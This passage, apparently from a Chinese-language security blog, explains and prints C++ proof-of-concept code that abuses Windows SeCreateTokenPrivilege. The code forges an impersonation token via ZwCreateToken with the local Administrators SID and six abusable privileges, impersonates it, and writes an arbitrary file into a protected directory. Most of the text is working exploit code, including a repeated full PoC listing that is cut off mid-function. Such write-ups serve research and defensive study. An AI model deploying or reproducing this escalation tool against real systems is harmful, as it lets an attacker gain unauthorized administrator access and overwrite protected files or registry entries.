	HANDLE hToken = NULL;
	HANDLE pElevatedToken = NULL;
	HANDLE hThread = NULL;
	LPCWSTR sourceFile = NULL;
	LPCWSTR destFile = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 's':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				sourceFile = (LPCWSTR)argv[1];
			}
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				destFile = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}

	// Enable SeCreateTokenPrivilege for the current process token.
	if (!EnableTokenPrivilege(hToken, SE_CREATE_TOKEN_NAME))
	{
		wprintf(L"[-] Failed to enable SeCreateTokenPrivilege for the current process token.\n");
		return 0;
	}

	pElevatedToken = CreateUserToken(hToken);
	if (pElevatedToken == NULL)
	{
		wprintf(L"[-] Failed to create user token.\n");
		return 0;
	}

	if (!DisplayTokenInformation(pElevatedToken))
	{
		wprintf(L"[-] Failed to get S4U token information.\n");
		return 0;
	}

	hThread = GetCurrentThread();

	if (!SetThreadToken(&hThread, pElevatedToken))
	{
		wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
		return 0;
	}
	wprintf(L"\n[*] Successfully impersonated the elevated token.\n");

	if (!ExploitSeCreateTokenPrivilege(sourceFile, destFile))
	{
		wprintf(L"[-] Failed to exploit SeCreateTokenPrivilege.\n");
		return 0;
	}
}
```

然后调用 `EnableTokenPrivilege()` 函数，该函数通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeCreateTokenPrivilege 特权，如下所示。

```c++
BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}
```

接着，凭借已开启的 SeCreateTokenPrivilege 特权，调用 `CreateUserToken()` 函数创建新令牌。

### Create User Token

`CreateUserToken()` 函数的定义如下。

```c++
HANDLE CreateUserToken(HANDLE hToken)
{
	NTSTATUS Status;
	HANDLE pElevatedToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	PTOKEN_PRIMARY_GROUP pTokenPrimaryGroup = NULL;
	PTOKEN_DEFAULT_DACL pTokenDefaultDacl = NULL;
	TOKEN_SOURCE tokenSource;
	PTOKEN_OWNER pTokenOwner = NULL;
	SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { sizeof(securityQualityOfService), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes), 0, 0, 0, 0, &securityQualityOfService };
	LUID AuthenticationId = SYSTEM_LUID;
	LARGE_INTEGER ExpirationTime;

	_ZwCreateToken ZwCreateToken;

	PISID pSid = NULL;
	SID_BUILTIN LocalAdminGroupSID = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32, DOMAIN_ALIAS_RID_ADMINS } };
	SID_INTEGRITY IntegrityMediumSID = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };

	HANDLE hThread = NULL;

	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}
	wprintf(L"[*] ZwCreateToken function loaded.\n");
	pTokenUser = (PTOKEN_USER)GetTokenInfo(hToken, TokenUser);

	strcpy_s(tokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
	AllocateLocallyUniqueId(&tokenSource.SourceIdentifier);

	pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
	pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);
	SetTokenPrivileges(pTokenPrivileges);
	pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
	pTokenPrimaryGroup = (PTOKEN_PRIMARY_GROUP)GetTokenInfo(hToken, TokenPrimaryGroup);
	pTokenDefaultDacl = (PTOKEN_DEFAULT_DACL)GetTokenInfo(hToken, TokenDefaultDacl);

	for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
	{
		if (pTokenGroups->Groups[i].Attributes & SE_GROUP_INTEGRITY)
		{
			memcpy(pTokenGroups->Groups[i].Sid, &IntegrityMediumSID, sizeof(IntegrityMediumSID));
			wprintf(L"[*] Set the token integrity level to medium.\n");
		}

		pSid = (PISID)pTokenGroups->Groups[i].Sid;
		if (pSid->SubAuthority[pSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
		{
			memcpy(pSid, &LocalAdminGroupSID, sizeof(LocalAdminGroupSID));
			pTokenGroups->Groups[i].Attributes = SE_GROUP_ENABLED;
			wprintf(L"[*] Add extra SID S-1-5-32-544 to token.\n");
		}
		else
		{
			pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	pTokenOwner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	pTokenOwner->Owner = pTokenUser->User.Sid;

	ExpirationTime.HighPart = 0xFFFFFFFF;
	ExpirationTime.LowPart = 0xFFFFFFFF;

	Status = ZwCreateToken(
		&pElevatedToken,
		TOKEN_ALL_ACCESS,
		&objectAttributes,
		TokenImpersonation,
		&AuthenticationId,
		&ExpirationTime,
		pTokenUser,
		pTokenGroups,
		pTokenPrivileges,
		pTokenOwner,
		pTokenPrimaryGroup,
		pTokenDefaultDacl,
		&tokenSource
	);
	if (Status != STATUS_SUCCESS)
	{
		wprintf(L"[-] ZwCreateToken Error: [0x%x].\n", Status);
		goto Clear;
	}
	wprintf(L"[*] ZwCreateToken successfully and get elevated token:\n\n");

	goto Clear;

Clear:
	if (pTokenPrivileges)
		LocalFree(pTokenPrivileges);
	if (pTokenOwner)
		LocalFree(pTokenOwner);
	if (hToken)
		CloseHandle(hToken);

	return pElevatedToken;
}
```

在 `CreateUserToken()` 函数内部，首先定义了新令牌对象的属性，以保证最终生成的令牌的模拟级别为 SecurityImpersonation：

```c++
SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { sizeof(securityQualityOfService), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes), 0, 0, 0, 0, &securityQualityOfService };
```

然后定义了两个 SID，分别代表本地管理员组的 SID，和 Medium 完整想等级等级的 SID：

```c++
SID_BUILTIN LocalAdminGroupSID = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32, DOMAIN_ALIAS_RID_ADMINS } };
SID_INTEGRITY IntegrityMediumSID = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };
```

接着通过 `GetProcAddress()` API 将 `ZwCreateToken()` 函数从 ntdll.dll 模块中加载进来，需要预先定义 ZwCreateToken 类型：

```c++
// ...
typedef NTSYSAPI NTSTATUS(NTAPI* _ZwCreateToken)(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
);
// ...
_ZwCreateToken ZwCreateToken;
// ...
ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
if (ZwCreateToken == NULL) {
	printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
	return NULL;
}
wprintf(L"[*] ZwCreateToken function loaded.\n");
```

由于要创建一个新的令牌，因此必须向 `ZwCreateToken()` 函数提供令牌的 TokenPrivileges、TokenGroups、TokenPrimaryGroup 和 TokenDefaultDacl 等信息。我们不需要自己构造这些信息，只需要从当前进程令牌中获取，最后将这些进行传入 `ZwCreateToken()` 函数。在此之前，需要在获取到的 TokenGroups 信息中设置 LocalAdminGroupSID 和 IntegrityMediumSID 两个 SID，以保证新生成的令牌拥有本地管理员权限并且完整性等级为 Medium。

```c++
pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);
SetTokenPrivileges(pTokenPrivileges);
pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
pTokenPrimaryGroup = (PTOKEN_PRIMARY_GROUP)GetTokenInfo(hToken, TokenPrimaryGroup);
pTokenDefaultDacl = (PTOKEN_DEFAULT_DACL)GetTokenInfo(hToken, TokenDefaultDacl);

for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
{
	if (pTokenGroups->Groups[i].Attributes & SE_GROUP_INTEGRITY)
  	{
    	memcpy(pTokenGroups->Groups[i].Sid, &IntegrityMediumSID, sizeof(IntegrityMediumSID));
    	wprintf(L"[*] Set the token integrity level to medium.\n");
  	}

  	pSid = (PISID)pTokenGroups->Groups[i].Sid;
  	if (pSid->SubAuthority[pSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
  	{
    	memcpy(pSid, &LocalAdminGroupSID, sizeof(LocalAdminGroupSID));
    	pTokenGroups->Groups[i].Attributes = SE_GROUP_ENABLED;
    	wprintf(L"[*] Add extra SID S-1-5-32-544 to token.\n");
  	}
  	else
  	{
        pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
        pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_ENABLED;
  	}
}
```

于此同时，我们当然可以为新生成的令牌开启一些新的危险特权。如下所示，`SetTokenPrivileges()` 函数在令牌的 TokenPrivileges 信息中启用了以下六个特权，他们都可以被滥用以实现特权提升。

- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- SeCreateTokenPrivilege
- SeRestorePrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

```c++
void SetTokenPrivileges(PTOKEN_PRIVILEGES pTokenPrivileges)
{
	LUID luid;

	pTokenPrivileges->PrivilegeCount = 6;

	// Enable SeImpersonatePrivilege
	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	pTokenPrivileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[0].Luid = luid;

	// Enable SeAssignPrimaryTokenPrivilege
	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	pTokenPrivileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[1].Luid = luid;

	// Enable SeCreateTokenPrivilege
	LookupPrivilegeValue(NULL, SE_CREATE_TOKEN_NAME, &luid);
	pTokenPrivileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[2].Luid = luid;

	// Enable SeRestorePrivilege
	LookupPrivilegeValue(NULL, SE_RESTORE_NAME, &luid);
	pTokenPrivileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[3].Luid = luid;

	// Enable SeTakeOwnershipPrivilege
	LookupPrivilegeValue(NULL, SE_TAKE_OWNERSHIP_NAME, &luid);
	pTokenPrivileges->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[4].Luid = luid;

	// Enable SeDebugPrivilege
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	pTokenPrivileges->Privileges[5].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[5].Luid = luid;
}
```

为了能够成功模拟新生成的令牌，还有最后重要的一点，就是将令牌的拥有者设为当前用户。这里也是先查询当前进程令牌的 TokenUser 信息，该信息与访问令牌关联的用户的 SID，我们只需要将这个 SID 设置到 `ZwCreateToken()` 函数的 `Owner` 参数中即可：

```
pTokenUser = (PTOKEN_USER)GetTokenInfo(hToken, TokenUser);
// ...
pTokenOwner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
pTokenOwner->Owner = pTokenUser->User.Sid;
```

最后将调用 `ZwCreateToken()` 函数来生成模拟令牌，生成的令牌被保存在 `pElevatedToken` 指针所指向的内存中：

```c++
Status = ZwCreateToken(
	&pElevatedToken,
	TOKEN_ALL_ACCESS,
    &objectAttributes,
    TokenImpersonation,
    &AuthenticationId,
    &ExpirationTime,
    pTokenUser,
    pTokenGroups,
    pTokenPrivileges,
    pTokenOwner,
    pTokenPrimaryGroup,
    pTokenDefaultDacl,
    &tokenSource
);
if (Status != STATUS_SUCCESS)
{
	wprintf(L"[-] ZwCreateToken Error: [0x%x].\n", Status);
    goto Clear;
}
wprintf(L"[*] ZwCreateToken successfully and get elevated token:\n\n");
```

### Display Token Information

如果没有什么问题，`CreateUserToken()` 会将新令牌返回到主函数，并传递给 `DisplayTokenInformation()` 函数获取并打印令牌的 TokenStatistics、TokenGroups、TokenIntegrityLevel 和 TokenPrivileges 信息，如下所示。

```c++
BOOL DisplayTokenInformation(HANDLE hToken)
{
	BOOL status = FALSE;
	DWORD dwLength = 0;
	PTOKEN_STATISTICS pTokenStatistics = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	DWORD dwNameSize;
	DWORD dwDomainSize;
	LPWSTR lpGroupName = NULL;
	LPWSTR lpDomainName = NULL;
	LPWSTR lpGroupAccountName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
	SID_NAME_USE peUse;

	PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
	PSID pSid;
	LPWSTR lpGroupSid;
	LPWSTR lpIntegritySid;
	UINT len = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	LPWSTR lpName = NULL;
	LPWSTR lpAttrbutes = (LPWSTR)LocalAlloc(LPTR, 8 * sizeof(WCHAR));

	// Get Token Statistics Information
	pTokenStatistics = (PTOKEN_STATISTICS)GetTokenInfo(hToken, TokenStatistics);
	if (pTokenStatistics != NULL)
	{
		wprintf(L" > Token Statistics Information: \n");
		wprintf(L"	 Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
		wprintf(L"	 Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
		wprintf(L"	 Token Type          : %d\n", pTokenStatistics->TokenType);
		wprintf(L"	 Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
		wprintf(L"	 Group Count         : %d\n", pTokenStatistics->GroupCount);
		wprintf(L"	 Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

		status = TRUE;
	}

	pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
	if (pTokenGroups != NULL)
	{
		wprintf(L" > Token Group Information: \n");
		for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
		{
			if (!(pTokenGroups->Groups[i].Attributes & SE_GROUP_LOGON_ID))
			{
				pSid = pTokenGroups->Groups[i].Sid;
				dwNameSize = MAX_PATH;
				dwDomainSize = MAX_PATH;
				lpGroupName = (LPWSTR)LocalAlloc(LPTR, dwNameSize * sizeof(WCHAR));
				lpDomainName = (LPWSTR)LocalAlloc(LPTR, dwDomainSize * sizeof(WCHAR));
				if (!LookupAccountSidW(NULL, pSid, lpGroupName, &dwNameSize, lpDomainName, &dwDomainSize, &peUse))
				{
					wprintf(L"[-] LookupAccountSidW Error: [%u].\n", GetLastError());
					goto Clear;
				}

				if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
					wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
					goto Clear;
				}

				len = wsprintf(lpGroupAccountName, TEXT("%ws%ws%ws"), lpDomainName, dwDomainSize != 0 ? L"\\" : L"", lpGroupName);
				wprintf(L"	 %-50ws%ws\n", lpGroupAccountName, lpGroupSid);
				dwNameSize = MAX_PATH;
				dwDomainSize = MAX_PATH;
			}
			
		}

		status = TRUE;
	}

	pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)GetTokenInfo(hToken, TokenIntegrityLevel);
	if (pTokenIntegrityLevel != NULL)
	{
		wprintf(L"\n > Token Integrity Level: \n");
		pSid = pTokenIntegrityLevel->Label.Sid;
		if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
			wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
			goto Clear;
		}
		wprintf(L"	 %ws\n", lpIntegritySid);

		status = TRUE;
	}

	pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);

	wprintf(L"\n > Token Privileges Information: \n");
	dwLength = MAX_PATH;
	for (int i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		lpName = (LPWSTR)LocalAlloc(LPTR, dwLength * sizeof(WCHAR));
		if (!(status = LookupPrivilegeNameW(NULL, &pTokenPrivileges->Privileges[i].Luid, lpName, &dwLength)))
		{
			wprintf(L"[-] LookupPrivilegeNameW Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"	 %-50ws", lpName);
		if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
			len += wsprintf(lpAttrbutes, TEXT("Enabled"));
		if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
			len += wsprintf(lpAttrbutes, TEXT("Enabled"));
		if (lpAttrbutes[0] == 0)
			wsprintf(lpAttrbutes, TEXT("Disabled"));
		wprintf(L"%ws\n", lpAttrbutes);
		dwLength = MAX_PATH;
	}

Clear:
	if (pTokenStatistics != NULL)
		LocalFree(pTokenStatistics);
	if (pTokenGroups != NULL)
		LocalFree(pTokenGroups);

	return status;
}
```

### Impersonate The Elevated Token

接着，会调用 `SetThreadToken()` 函数将当前线程的令牌替换为新生成的令牌，如下所示。

```c++
hThread = GetCurrentThread();

if (!SetThreadToken(&hThread, pElevatedToken))
{
	wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
	return 0;
}
wprintf(L"\n[*] Successfully impersonated the elevated token.\n");
```

到这里，我们就已经获取了本地管理员权限了，写入受保护目录、并写入/覆盖注册表项等特权操作都是轻而易举。

### Write To Protected Directory

在我的 POC 中，我编写了 `ExploitSeCreateTokenPrivilege()` 函数，用于将指定文件写入受保护目录，如下所示。

```c++
BOOL ExploitSeCreateTokenPrivilege(LPCWSTR sourceFile, LPCWSTR destFile)
{
	BOOL status = FALSE;
	HANDLE hSource, hDestination;
	char buffer[SIZE + 1];
	DWORD dwBytesRead, dwBytesWrite;

	if (sourceFile && destFile)
	{
		// Open source file.
		hSource = CreateFileW(sourceFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hSource == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] Could not open source file by CreateFileW: [%u].\n", GetLastError());
			return status;
		}
		// Create destination file.
		hDestination = CreateFileW(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDestination == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] Could not create destination file by CreateFileW: [%u].\n", GetLastError());
			return status;
		}
		// Read from source file.
		if (!ReadFile(hSource, buffer, SIZE, &dwBytesRead, NULL))
		{
			wprintf(L"[-] ReadFile Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Read bytes from %ws: %d\n", sourceFile, dwBytesRead);
		// Write to destination file.
		if (!WriteFile(hDestination, buffer, dwBytesRead, &dwBytesWrite, NULL))
		{
			wprintf(L"[-] WriteFile Error: [%u].\n", GetLastError());
			return status;
		}
		printf("[*] Bytes written to %ws: %d\n", destFile, dwBytesWrite);
		status = TRUE;
	}
}
```

最终完整的 POC 代码如下：

```c++
#include <Windows.h>
#include <winternl.h>
#define _NTDEF_ 
#include <NTSecAPI.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sddl.h>
#include <lmaccess.h>

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Netapi32.lib")

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define SIZE 200000
#define STATUS_SUCCESS           0

typedef struct _SID_BUILTIN
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[2];
} SID_BUILTIN, * PSID_BUILTIN;

typedef struct _SID_INTEGRITY
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[1];

} SID_INTEGRITY, * PSID_INTEGRITY;

typedef NTSYSAPI NTSTATUS(NTAPI* _ZwCreateToken)(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
);


BOOL ExploitSeCreateTokenPrivilege(LPCWSTR sourceFile, LPCWSTR destFile)
{
	BOOL status = FALSE;
	HANDLE hSource, hDestination;
	char buffer[SIZE + 1];
	DWORD dwBytesRead, dwBytesWrite;

	if (sourceFile && destFile)
	{
		// Open source file.
		hSource = CreateFileW(sourceFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hSource == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] Could not open source file by CreateFileW: [%u].\n", GetLastError());
			return status;
		}
		// Create destination file.
		hDestination = CreateFileW(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDestination == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] Could not create destination file by CreateFileW: [%u].\n", GetLastError());
			return status;
		}
		// Read from source file.
		if (!ReadFile(hSource, buffer, SIZE, &dwBytesRead, NULL))
		{
			wprintf(L"[-] ReadFile Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Read bytes from %ws: %d\n", sourceFile, dwBytesRead);
		// Write to destination file.
		if (!WriteFile(hDestination, buffer, dwBytesRead, &dwBytesWrite, NULL))
		{
			wprintf(L"[-] WriteFile Error: [%u].\n", GetLastError());
			return status;
		}
		printf("[*] Bytes written to %ws: %d\n", destFile, dwBytesWrite);
		status = TRUE;
	}
}


PVOID GetTokenInfo(HANDLE hToken, TOKEN_INFORMATION_CLASS TokenInfoClass)
{
	DWORD dwLength = 0;
	PVOID pTokenData = NULL;

	if (!GetTokenInformation(hToken, TokenInfoClass, NULL, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenData = LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenInfoClass, pTokenData, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}
		return pTokenData;
	}

Clear:
	if (pTokenData != NULL)
		LocalFree(pTokenData);

	return 0;
}

BOOL DisplayTokenInformation(HANDLE hToken)
{
	BOOL status = FALSE;
	DWORD dwLength = 0;
	PTOKEN_STATISTICS pTokenStatistics = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	DWORD dwNameSize;
	DWORD dwDomainSize;
	LPWSTR lpGroupName = NULL;
	LPWSTR lpDomainName = NULL;
	LPWSTR lpGroupAccountName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
	SID_NAME_USE peUse;

	PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
	PSID pSid;
	LPWSTR lpGroupSid;
	LPWSTR lpIntegritySid;
	UINT len = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	LPWSTR lpName = NULL;
	LPWSTR lpAttrbutes = (LPWSTR)LocalAlloc(LPTR, 8 * sizeof(WCHAR));

	// Get Token Statistics Information
	pTokenStatistics = (PTOKEN_STATISTICS)GetTokenInfo(hToken, TokenStatistics);
	if (pTokenStatistics != NULL)
	{
		wprintf(L" > Token Statistics Information: \n");
		wprintf(L"	 Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
		wprintf(L"	 Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
		wprintf(L"	 Token Type          : %d\n", pTokenStatistics->TokenType);
		wprintf(L"	 Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
		wprintf(L"	 Group Count         : %d\n", pTokenStatistics->GroupCount);
		wprintf(L"	 Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

		status = TRUE;
	}

	pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
	if (pTokenGroups != NULL)
	{
		wprintf(L" > Token Group Information: \n");
		for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
		{
			if (!(pTokenGroups->Groups[i].Attributes & SE_GROUP_LOGON_ID))
			{
				pSid = pTokenGroups->Groups[i].Sid;
				dwNameSize = MAX_PATH;
				dwDomainSize = MAX_PATH;
				lpGroupName = (LPWSTR)LocalAlloc(LPTR, dwNameSize * sizeof(WCHAR));
				lpDomainName = (LPWSTR)LocalAlloc(LPTR, dwDomainSize * sizeof(WCHAR));
				if (!LookupAccountSidW(NULL, pSid, lpGroupName, &dwNameSize, lpDomainName, &dwDomainSize, &peUse))
				{
					wprintf(L"[-] LookupAccountSidW Error: [%u].\n", GetLastError());
					goto Clear;
				}

				if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
					wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
					goto Clear;
				}

				len = wsprintf(lpGroupAccountName, TEXT("%ws%ws%ws"), lpDomainName, dwDomainSize != 0 ? L"\\" : L"", lpGroupName);
				wprintf(L"	 %-50ws%ws\n", lpGroupAccountName, lpGroupSid);
				dwNameSize = MAX_PATH;
				dwDomainSize = MAX_PATH;
			}
			
		}

		status = TRUE;
	}

	pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)GetTokenInfo(hToken, TokenIntegrityLevel);
	if (pTokenIntegrityLevel != NULL)
	{
		wprintf(L"\n > Token Integrity Level: \n");
		pSid = pTokenIntegrityLevel->Label.Sid;
		if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
			wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
			goto Clear;
		}
		wprintf(L"	 %ws\n", lpIntegritySid);

		status = TRUE;
	}

	pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);

	wprintf(L"\n > Token Privileges Information: \n");
	dwLength = MAX_PATH;
	for (int i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		lpName = (LPWSTR)LocalAlloc(LPTR, dwLength * sizeof(WCHAR));
		if (!(status = LookupPrivilegeNameW(NULL, &pTokenPrivileges->Privileges[i].Luid, lpName, &dwLength)))
		{
			wprintf(L"[-] LookupPrivilegeNameW Error: [%u].\n", GetLastError());
			return status;
		}
